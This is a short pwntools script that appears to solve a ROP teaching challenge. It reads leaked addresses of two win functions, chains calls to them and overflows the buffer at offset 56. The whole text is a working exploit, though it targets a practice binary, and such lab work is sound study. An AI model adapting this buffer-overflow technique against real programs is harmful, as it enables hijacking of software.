from pwn import *
context.clear(arch='amd64')
context.binary = 'babyrop_level2_teaching1'
p = process('./babyrop_level2_teaching1')
rop = ROP(context.binary)
p.recvuntil(b'().')
p.recvline()
x = p.recvline().decode('utf-8')
addr1 = int(x[x.find('0'):-2], 16)
x = p.recvline().decode('utf-8')
addr2 = int(x[x.find('0'):-2], 16)
log.info('win_stage_1() at '+hex(addr1))
log.info('win_stage_2() at '+hex(addr2))
r = ROP(context.binary)
r.call(addr1)
r.call(addr2)
# send the ROP chain
p.sendline(fit({56:r.chain()}))
p.interactive()